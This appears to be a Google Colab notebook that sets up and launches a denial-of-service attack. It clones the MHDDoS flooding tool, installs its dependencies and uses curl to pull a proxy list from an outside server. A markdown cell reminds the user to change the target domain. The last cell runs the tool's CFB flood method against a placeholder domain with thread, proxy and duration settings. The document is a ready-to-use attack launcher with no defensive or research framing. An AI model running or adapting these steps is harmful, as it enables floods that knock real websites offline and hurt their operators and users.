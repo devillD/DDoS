{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!apt -qq update && apt -qq install git -y"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YCY6HUBOJ37u",
        "outputId": "0ac94313-e5a0-4ed5-e44a-f8e9c521a55d"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "41 packages can be upgraded. Run 'apt list --upgradable' to see them.\n",
            "git is already the newest version (1:2.17.1-1ubuntu0.9).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 41 not upgraded.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/MHProDev/MHDDoS.git dos"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dOlXscAmJ82w",
        "outputId": "842a6089-f51d-4528-9073-45b26c31f514"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "fatal: destination path 'dos' already exists and is not an empty directory.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!mv dos/* . && rm -rf dos"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lb0zCETpKue8",
        "outputId": "91d9ee54-41c0-466f-c5dc-46efb0f4e1da"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "mv: cannot stat 'dos/*': No such file or directory\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip3 install --no-cache-dir -r requirements.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FnNOQjaCKwoq",
        "outputId": "d3de186d-e470-49d6-a9f4-448a8966822c"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Log removed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!curl https://o-abirxox.cloud.okteto.net/proxyA.txt -o proxy.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RrC91k1kNcPW",
        "outputId": "d937bc45-1355-43b9-b6af-93195ad4d30d"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            "100  406k  100  406k    0     0   500k      0 --:--:-- --:--:-- --:--:--  500k\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "[**README**](https://telegra.ph/DoS-03-12)\n",
        "\n",
        "`Don't forget to change your tergat domain`"
      ],
      "metadata": {
        "id": "Ji4EbcQwTat-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!python3 start.py CFB terget.domain 0 894 proxy.txt 61 1693"
      ],
      "metadata": {
        "id": "zFtrWTutYEHJ"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "Welcome to Colaboratory",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
